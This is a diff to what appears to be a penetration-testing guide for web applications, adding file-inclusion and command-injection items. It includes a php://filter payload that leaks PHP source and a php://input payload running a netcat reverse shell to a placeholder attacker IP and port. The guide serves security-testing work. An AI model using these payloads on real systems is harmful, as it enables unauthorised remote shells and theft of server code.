@@ -90,10 +90,12 @@ Next, we want to attempt any of the (OWASP top 10)[https://www.owasp.org/index.p
 root@attacker-system:~# dotdotpwn -h (TARGET IP ADDRESS) -m http -f config.php
 ```
 2. **SQL Injection** - [SQLMap](http://sqlmap.org/) can be used to test advanced SQL Injection
-3. **File Inclusion** - Fuzz Web GET and POST parameters. You can also use **BurpSuite CE** in the *Intruder* tab to attempt an LFi Attack on the target system's HTTP requests parameters.
+3. **File Inclusion and Command Injection** - Fuzz Web GET and POST parameters. You can also use **BurpSuite CE** in the *Intruder* tab to attempt an LFi Attack on the target system's HTTP requests parameters.
    1. `?file=foo.txt` may be vulnerable to local file includion (LFi)
    2. `?page=foo` may be vulnerable to local file inclusion (LFi)
-   3. `?url=http://someurl` may be vulnerable to remote file inclusion (RFi)
+   3. `?page=php://filter/convert.base64-encode/resource=index` - this payload will base64 encode the index.php file and return it in the DOM.
+   4. `?page=php://input` with `<? system('nc -e /bin/bash (ATTACKER IP ADDRESS) (ATTACKER PORT)'); ?>` as POST data - command injection technique.
+   5. `?url=http://someurl` may be vulnerable to remote file inclusion (RFi)
 4. **Session Management** - Use the [Quick Cookie Manager](https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/) Firefox plugin to analyze and set cookies.
 ## 6. Burp Suite CE
 Use the BurpSuite Community Edition to analyze all requests from the server. 
